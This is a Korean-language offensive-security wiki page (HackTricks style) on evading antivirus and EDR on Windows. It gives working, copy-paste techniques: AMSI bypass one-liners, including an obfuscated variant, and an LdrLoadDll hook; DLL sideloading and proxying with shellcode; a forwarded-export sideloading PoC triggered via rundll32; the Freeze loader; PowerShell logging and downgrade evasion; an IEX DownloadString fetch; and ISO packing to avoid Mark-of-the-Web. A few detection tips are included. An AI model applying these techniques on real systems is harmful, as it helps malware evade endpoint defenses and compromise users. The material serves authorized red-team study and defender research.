# 안티바이러스(AV) 우회

{{#include ../banners/hacktricks-training.md}}

**이 페이지는** [**@m2rc_p**](https://twitter.com/m2rc_p)**님이 작성했습니다!**

## Defender 중지

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender가 동작하지 못하도록 중지시키는 도구입니다.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV로 가장하여 Windows Defender가 동작하지 못하게 하는 도구입니다.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV 회피 방법론**

현재 AV는 파일이 악성인지 여부를 판별하기 위해 여러 가지 방식을 사용합니다: static detection, dynamic analysis, 그리고 더 발전된 EDRs의 경우 behavioural analysis까지 수행합니다.

### **Static detection**

Static detection은 바이너리나 스크립트 안의 알려진 악성 문자열 또는 바이트 배열을 플래그하거나, 파일 자체에서 정보를 추출하는 방식(e.g. file description, company name, digital signatures, icon, checksum 등)으로 이루어집니다. 이는 공개된 도구를 사용할 경우 이미 분석되어 악성으로 분류되었을 가능성이 높기 때문에 더 쉽게 탐지될 수 있음을 의미합니다. 이런 유형의 탐지를 우회하는 방법은 몇 가지가 있습니다:

- **Encryption**

바이너리를 암호화하면 AV가 프로그램을 식별할 방법이 없어지지만, 메모리에서 프로그램을 복호화하고 실행할 수 있는 로더가 필요합니다.

- **Obfuscation**

때로는 바이너리나 스크립트의 일부 문자열만 변경해도 AV를 통과할 수 있지만, 무엇을 난독화하느냐에 따라 시간 소모가 클 수 있습니다.

- **Custom tooling**

자체 도구를 개발하면 알려진 악성 시그니처가 없기 때문에 탐지가 줄어들지만, 많은 시간과 노력이 필요합니다.

> [!TIP]
> Windows Defender의 static detection을 점검하는 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 분할한 뒤 Defender에게 각 세그먼트를 개별적으로 스캔하게 하여, 바이너리에서 정확히 어떤 문자열이나 바이트가 플래그되는지 알려줍니다.

실무적인 AV 회피에 관한 이 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)를 강력히 추천합니다.

### **Dynamic analysis**

Dynamic analysis는 AV가 바이너리를 샌드박스에서 실행하고 악성 활동(예: 브라우저 비밀번호를 복호화하여 읽으려 함, LSASS에 대한 minidump 수행 등)을 관찰하는 방식입니다. 이 부분은 다루기 더 까다로울 수 있지만, 샌드박스를 회피하기 위해 사용할 수 있는 몇 가지 기법이 있습니다.

- **Sleep before execution** 샌드박스가 어떻게 구현되어 있느냐에 따라 AV의 dynamic analysis를 우회하는 훌륭한 방법이 될 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 스캔할 시간이 매우 짧기 때문에, 긴 sleep을 사용하면 바이너리 분석을 방해할 수 있습니다. 문제는 많은 AV 샌드박스가 구현 방식에 따라 sleep을 건너뛸 수 있다는 점입니다.
- **Checking machine's resources** 일반적으로 샌드박스는 사용할 수 있는 리소스가 매우 적습니다(e.g. < 2GB RAM). 그렇지 않으면 사용자의 기기를 느리게 만들 수 있기 때문입니다. 여기서 창의적으로 접근할 수 있는데, 예를 들어 CPU 온도나 팬 속도를 체크하는 등 샌드박스에 구현되어 있지 않을 가능성이 있는 항목을 검사할 수 있습니다.
- **Machine-specific checks** 표적 사용자가 "contoso.local" 도메인에 가입된 워크스테이션을 사용한다면, 컴퓨터의 도메인을 확인하여 일치하지 않으면 프로그램을 종료하도록 만들 수 있습니다.

실제로 Microsoft Defender의 Sandbox 컴퓨터 이름은 HAL9TH입니다. 따라서 악성 코드를 실행하기 전에 컴퓨터 이름을 검사하여 HAL9TH와 일치하면 Defender의 샌드박스 안에 있다는 뜻이므로 프로그램을 종료하도록 할 수 있습니다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>출처: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

샌드박스를 상대할 때 유용한 몇 가지 다른 팁은 [@mgeeky](https://twitter.com/mariuszbit)로부터 나옵니다.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

앞서 언급했듯이 **공개 도구**는 결국 **탐지**됩니다. 그래서 스스로에게 질문해보세요:

예를 들어 LSASS를 덤프하려 한다면, **정말로 mimikatz를 사용해야만 할까요**? 아니면 덜 알려져 있고 LSASS를 덤프할 수 있는 다른 프로젝트를 사용할 수 있을까요.

정답은 후자일 가능성이 큽니다. mimikatz를 예로 들면, 이 프로젝트는 멋지긴 하지만 AV와 EDR에 의해 가장 많이 플래그되는 도구 중 하나이며, AV를 우회하기 위해 작업하기엔 악몽 같은 경우가 많습니다. 따라서 달성하려는 목적에 대해 대안을 찾아보세요.

> [!TIP]
> 페이로드를 회피용으로 수정할 때에는 Defender에서 자동 샘플 제출(automatic sample submission)을 끄는 것을 잊지 마세요. 그리고 장기적인 회피를 목표로 한다면, 정말로 **DO NOT UPLOAD TO VIRUSTOTAL**입니다. 특정 AV에서 페이로드가 탐지되는지 확인하고 싶다면, VM에 해당 AV를 설치하고 자동 샘플 제출을 끈 뒤 그곳에서 테스트하여 만족스러운 결과가 나올 때까지 반복하세요.

## EXEs vs DLLs

가능한 경우 항상 **evasion을 위해 DLL을 우선적으로 사용**하세요. 제 경험상 DLL 파일은 보통 **탐지가 훨씬 덜** 되고 분석 대상에서도 제외되는 경우가 많아, 일부 상황에서는 탐지를 피하기 위한 아주 간단한 트릭이 됩니다(물론 페이로드가 DLL로 실행될 수 있는 방법이 있어야 합니다).

이 이미지에서 볼 수 있듯이, Havoc의 DLL 페이로드는 antiscan.me에서 4/26 탐지율을 보인 반면 EXE 페이로드는 7/26 탐지율을 보였습니다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me에서의 일반 Havoc EXE 페이로드 vs 일반 Havoc DLL 비교</p></figcaption></figure>

이제 DLL 파일을 사용하여 훨씬 더 은밀해질 수 있는 몇 가지 트릭을 보여드리겠습니다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 로더가 사용하는 DLL 검색 순서를 악용하여, 취약한 애플리케이션과 악성 페이로드를 서로 나란히 배치하는 방식입니다.

[Siofra](https://github.com/Cybereason/siofra)와 다음의 powershell 스크립트를 사용하면 DLL Sideloading에 취약한 프로그램을 확인할 수 있습니다:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 "C:\Program Files\\" 내에서 DLL hijacking에 취약한 프로그램 목록과 해당 프로그램들이 로드하려고 시도하는 DLL 파일들을 출력합니다.

개인적으로 **explore DLL Hijackable/Sideloadable programs yourself**를 강력히 권합니다. 이 기술은 제대로 수행하면 매우 은밀하지만, 공개적으로 알려진 DLL Sideloadable 프로그램을 사용하면 쉽게 걸릴 수 있습니다.

프로그램이 로드할 것으로 예상하는 이름의 malicious DLL을 단순히 배치한다고 해서 payload가 실행되는 것은 아닙니다. 프로그램은 해당 DLL 내에 특정 함수를 기대하기 때문입니다. 이 문제를 해결하기 위해 **DLL Proxying/Forwarding**이라는 다른 기법을 사용하겠습니다.

**DLL Proxying**은 프로그램이 프록시(및 malicious) DLL에 하는 호출을 원래 DLL로 전달하여 프로그램의 기능을 유지하면서 payload 실행을 처리할 수 있게 합니다.

저는 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 [@flangvik](https://twitter.com/Flangvik/)의 것으로 사용할 것입니다.

제가 따른 단계는 다음과 같습니다:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 2개의 파일을 생성합니다: DLL 소스 코드 템플릿과 원래 이름이 변경된 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

우리의 shellcode ([SGN](https://github.com/EgeBalci/sgn)로 인코딩됨)과 proxy DLL은 [antiscan.me](https://antiscan.me)에서 탐지율 0/26을 기록했습니다! 성공이라고 부를 만합니다.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **강력히 권장합니다**: DLL Sideloading에 관한 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)와 또한 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)를 시청해 우리가 논의한 내용을 더 깊이 이해하세요.

### Forwarded Exports 악용 (ForwardSideLoading)

Windows PE 모듈은 실제로 "forwarders"인 함수를 export할 수 있습니다: 코드로 직접 연결하는 대신, export 엔트리는 `TargetDll.TargetFunc` 형식의 ASCII 문자열을 포함합니다. 호출자가 export를 resolve할 때 Windows 로더는:

- 이미 로드되어 있지 않다면 `TargetDll`을 로드합니다
- 그 모듈에서 `TargetFunc`를 resolve합니다

이해해야 할 주요 동작:
- `TargetDll`이 KnownDLL이라면 보호된 KnownDLLs 네임스페이스(예: ntdll, kernelbase, ole32)에서 제공됩니다.
- `TargetDll`이 KnownDLL이 아니라면, 일반 DLL 검색 순서가 사용되며, 여기에는 forward 해석을 수행하는 모듈의 디렉터리가 포함됩니다.

이는 간접적인 sideloading primitive를 가능하게 합니다: 함수가 non-KnownDLL 모듈 이름으로 forward된 export를 가진 서명된 DLL을 찾고, 그 서명된 DLL과 동일한 디렉터리에 forward된 대상 모듈 이름과 정확히 일치하는 attacker-controlled DLL을 함께 배치하세요. forward된 export가 호출되면 로더는 forward를 해결하고 동일한 디렉터리에서 당신의 DLL을 로드하여 DllMain을 실행합니다.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로 일반 검색 순서에 따라 해결됩니다.

PoC (복사-붙여넣기):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더로 복사합니다
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 같은 폴더에 악성 `NCRYPTPROV.dll`을 배치하세요. 최소한의 DllMain만으로 코드 실행이 가능하며, DllMain을 트리거하기 위해 forwarded function을 구현할 필요는 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 포워드를 트리거:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- `rundll32` (signed)는 side-by-side `keyiso.dll` (signed)을 로드합니다
- `KeyIsoSetAuditingInterface`를 해결하는 동안 로더는 포워드를 따라 `NCRYPTPROV.SetAuditingInterface`로 이동합니다
- 그 후 로더는 `C:\test`에서 `NCRYPTPROV.dll`을 로드하고 그 `DllMain`을 실행합니다
- `SetAuditingInterface`가 구현되어 있지 않으면 `DllMain`이 이미 실행된 이후에야 "missing API" 오류가 발생합니다

Hunting tips:
- 대상 모듈이 KnownDLL이 아닌 forwarded exports에 집중하세요. KnownDLLs는 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 아래에 나열되어 있습니다.
- 다음과 같은 도구로 forwarded exports를 열거할 수 있습니다:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 forwarder 인벤토리를 확인하여 후보를 검색하세요: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (예: rundll32.exe)이 비시스템 경로에서 서명된 DLL을 로드한 후, 같은 디렉터리에서 동일한 기본 이름을 가진 non-KnownDLLs를 로드하는 것을 모니터링하세요
- 다음과 같은 프로세스/모듈 체인에 대해 경보를 발생시키세요: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` (user-writable 경로 하)
- 코드 무결성 정책(WDAC/AppLocker)을 적용하고 애플리케이션 디렉터리에서 write+execute를 차단하세요

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze를 사용하여 shellcode를 은밀한 방식으로 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 회피는 단지 고양이와 생쥐 게임일 뿐입니다. 오늘 작동하는 것이 내일 탐지될 수 있으므로 단일 도구에만 의존하지 말고, 가능하면 여러 회피 기법을 연쇄적으로 사용해 보세요.

## AMSI (Anti-Malware Scan Interface)

AMSI는 "fileless malware"를 방지하기 위해 만들어졌습니다. 애초에 AVs는 **files on disk**만 스캔할 수 있었기 때문에, payload를 **directly in-memory**에서 실행할 수 있다면 AV는 충분한 가시성이 없어 이를 막을 수 없었습니다.

AMSI 기능은 Windows의 다음 구성 요소에 통합되어 있습니다.

- User Account Control, 또는 UAC (EXE, COM, MSI 또는 ActiveX 설치의 권한 상승)
- PowerShell (스크립트, 대화형 사용 및 동적 코드 평가)
- Windows Script Host (wscript.exe 및 cscript.exe)
- JavaScript 및 VBScript
- Office VBA macros

이 기능은 스크립트 내용을 암호화되지 않고 난독화되지 않은 형태로 노출하여, antivirus 솔루션이 스크립트 동작을 검사할 수 있도록 합니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음과 같은 알림이 발생합니다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`가 앞에 붙고, 그 다음에 스크립트를 실행한 실행 파일의 경로(이 경우 powershell.exe)가 오는 것을 확인할 수 있습니다.

우리는 디스크에 어떤 파일도 떨어뜨리지 않았지만, AMSI 때문에 인메모리에서 감지되었습니다.

또한, **.NET 4.8**부터는 C# 코드도 AMSI를 통해 실행됩니다. 이는 `Assembly.Load(byte[])`를 통한 인메모리 로드에도 영향을 줍니다. 따라서 AMSI를 회피하려면 인메모리 실행을 위해 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

AMSI를 우회하는 방법에는 몇 가지가 있습니다:

- **Obfuscation**

  AMSI는 주로 정적 탐지로 동작하기 때문에, 로드하려는 스크립트를 수정하는 것은 탐지를 회피하는 좋은 방법이 될 수 있습니다.

  그러나 AMSI는 여러 레이어로 난독화되어 있더라도 스크립트를 역난독화할 수 있는 기능이 있기 때문에, 난독화는 어떻게 수행되느냐에 따라 나쁜 선택일 수 있습니다. 이로 인해 회피가 그렇게 간단하지 않습니다. 하지만 때로는 몇몇 변수 이름만 바꾸면 충분할 때도 있으므로, 얼마나 심하게 탐지에 표시되었느냐에 따라 다릅니다.

- **AMSI Bypass**

  AMSI는 powershell(및 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하는 방식으로 구현되기 때문에, 권한이 없는 사용자로 실행 중이더라도 이를 쉽게 조작할 수 있습니다. AMSI 구현상의 이 결함으로 인해 연구자들은 AMSI 스캔을 회피하는 여러 방법을 발견했습니다.

**Forcing an Error**

AMSI 초기화가 실패(amsiInitFailed)하도록 강제하면 현재 프로세스에 대해 스캔이 시작되지 않습니다. 이 방법은 원래 [Matt Graeber](https://twitter.com/mattifestation)가 공개했으며, Microsoft는 더 넓은 사용을 막기 위해 시그니처를 개발했습니다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
현재 powershell 프로세스에서 AMSI를 사용할 수 없게 만드는 데 필요한 것은 powershell 코드 한 줄뿐이었다. 물론 이 한 줄은 AMSI 자체에 의해 탐지되었기 때문에, 이 기법을 사용하려면 약간의 수정이 필요하다.

다음은 제가 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass입니다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

Memory Patching

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)을 참조하세요.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

구현 개요 (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript 및 커스텀 로더 전반에서 동작합니다(AMSI를 로드하는 모든 환경 포함).
- 긴 명령줄 흔적을 피하려면 스크립트를 stdin을 통해 공급(`PowerShell.exe -NoProfile -NonInteractive -Command -`)하는 방식과 함께 사용하세요.
- LOLBins을 통해 실행되는 로더(예: `regsvr32`가 `DllRegisterServer`를 호출하는 경우)에서 사용되는 것이 관찰되었습니다.

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

현재 프로세스의 메모리에서 감지된 AMSI 시그니처를 제거하려면 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 또는 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 같은 도구를 사용할 수 있습니다. 이 도구들은 현재 프로세스의 메모리를 스캔하여 AMSI 시그니처를 찾은 다음 NOP 명령으로 덮어써 메모리에서 사실상 제거합니다.

**AV/EDR products that uses AMSI**

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**에서 확인할 수 있습니다.

**Use Powershell version 2**
PowerShell 버전 2를 사용하면 AMSI가 로드되지 않으므로 스크립트가 AMSI로 스캔되지 않고 실행됩니다. 다음과 같이 할 수 있습니다:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있게 해주는 기능입니다. 이는 감사(auditing)나 문제 해결에 유용할 수 있지만, **탐지를 회피하려는 공격자에게는 문제가 될 수 있습니다**.

PowerShell logging을 우회하려면 다음 기법들을 사용할 수 있습니다:

- **Disable PowerShell Transcription and Module Logging**: 이 목적을 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있습니다.
- **Use Powershell version 2**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 스크립트가 AMSI로 스캔되지 않고 실행됩니다. 이렇게 실행할 수 있습니다: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 를 사용하여 방어가 없는 powershell 세션을 생성하세요 (this is what `powerpick` from Cobal Strike uses).

## Obfuscation

> [!TIP]
> 여러 난독화 기법은 데이터를 암호화하는 것에 의존하며, 이는 바이너리의 엔트로피를 증가시켜 AVs 및 EDRs가 이를 감지하기 쉽게 만듭니다. 이 점을 주의하고, 민감하거나 숨겨야 할 코드의 특정 섹션에만 암호화를 적용하는 것을 고려하세요.

### ConfuserEx로 보호된 .NET 바이너리의 난독화 해제

ConfuserEx 2(혹은 상용 포크)를 사용하는 악성코드를 분석할 때, 디컴파일러와 샌드박스를 차단하는 여러 보호 레이어를 마주치는 것이 흔합니다. 아래 워크플로우는 이후 dnSpy나 ILSpy 같은 도구에서 C#으로 디컴파일할 수 있는 거의 원본에 가까운 IL을 신뢰성 있게 복원합니다.

1.  안티탬퍼 제거 – ConfuserEx는 모든 *method body*를 암호화하고 *module* 정적 생성자(`<Module>.cctor`) 내부에서 이를 복호화합니다. 또한 PE 체크섬을 패치하여 수정 시 바이너리가 크래시되게 합니다. 암호화된 메타데이터 테이블을 찾아 XOR 키를 복구하고 깨끗한 어셈블리를 다시 쓰기 위해 **AntiTamperKiller**를 사용하세요:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
출력에는 언패커를 만들 때 유용한 6개의 안티탬퍼 파라미터(`key0-key3`, `nameHash`, `internKey`)가 포함됩니다.

2.  심볼 / 제어 흐름 복구 – *clean* 파일을 ConfuserEx 인식 포크인 **de4dot-cex**에 입력하세요.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
플래그:
• `-p crx` – ConfuserEx 2 프로파일 선택  
• de4dot는 제어 흐름 평탄화(control-flow flattening)를 되돌리고, 원래의 네임스페이스, 클래스 및 변수 이름을 복원하며 상수 문자열을 복호화합니다.

3.  프록시-콜 제거 – ConfuserEx는 디컴파일을 더 어렵게 하기 위해 직접 메서드 호출을 경량 래퍼(일명 *proxy calls*)로 대체합니다. **ProxyCall-Remover**로 이를 제거하세요:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 이후에는 `Class8.smethod_10` 같은 불분명한 래퍼 함수 대신 `Convert.FromBase64String` 또는 `AES.Create()` 같은 정상적인 .NET API가 보일 것입니다.

4.  수동 정리 – 결과 바이너리를 dnSpy로 열고 큰 Base64 블롭이나 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색하여 *실제* 페이로드를 찾으세요. 종종 악성코드는 `<Module>.byte_0` 내부에 TLV-인코딩된 바이트 배열로 저장해 둡니다.

위 체인은 악성 샘플을 실행하지 않고도 실행 흐름을 복원하므로 오프라인 워크스테이션에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 커스텀 어트리뷰트를 생성합니다. 이는 샘플을 자동 분류하기 위한 IOC로 사용할 수 있습니다.

#### 원라이너
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목적은 [LLVM](http://www.llvm.org/) 컴파일 스위트의 오픈 소스 포크를 제공하여 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 및 변조 방지를 통해 소프트웨어 보안을 향상시키는 것입니다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 `C++11/14` 언어를 사용하여 외부 도구나 컴파일러 수정 없이 컴파일 시점에 obfuscated code를 생성하는 방법을 보여줍니다.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework로 생성된 obfuscated operations 레이어를 추가하여 애플리케이션을 크랙하려는 사람의 작업을 조금 더 어렵게 만듭니다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys 등을 포함한 다양한 PE 파일을 obfuscate할 수 있는 x64 binary obfuscator입니다.
- [**metame**](https://github.com/a0rtega/metame): Metame는 임의 실행 파일을 위한 간단한 metamorphic code 엔진입니다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP (return-oriented programming)를 사용하여 LLVM 지원 언어용의 세밀한 코드 obfuscation 프레임워크입니다. ROPfuscator는 일반 명령어를 ROP chains로 변환하여 어셈블리 코드 수준에서 프로그램을 obfuscate함으로써 정상적인 제어 흐름에 대한 우리의 자연스러운 개념을 무너뜨립니다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter입니다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 로드할 수 있습니다

## SmartScreen & MoTW

인터넷에서 일부 실행 파일을 다운로드하여 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 잠재적으로 악의적인 애플리케이션 실행으로부터 최종 사용자를 보호하기 위한 보안 메커니즘입니다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 평판 기반 접근 방식으로 작동하므로, 드물게 다운로드되는 애플리케이션은 SmartScreen을 유발하여 최종 사용자가 파일을 실행하지 못하도록 경고하고 차단합니다(파일은 여전히 More Info -> Run anyway를 클릭하면 실행할 수 있습니다).

**MoTW** (Mark of The Web)는 Zone.Identifier라는 이름의 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)으로, 인터넷에서 파일을 다운로드할 때 다운로드된 URL과 함께 자동으로 생성됩니다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS 확인.</p></figcaption></figure>

> [!TIP]
> 실행 파일이 **신뢰된** 서명 인증서로 서명되어 있으면 **SmartScreen이 작동하지 않습니다**.

페이로드가 Mark of The Web을 획득하지 못하도록 하는 매우 효과적인 방법 중 하나는 ISO와 같은 컨테이너 안에 패키징하는 것입니다. 이는 Mark-of-the-Web (MOTW)이 **non NTFS** 볼륨에는 **적용될 수 없기 때문**입니다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 페이로드를 출력 컨테이너로 패키징하여 Mark-of-the-Web을 회피하는 도구입니다.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
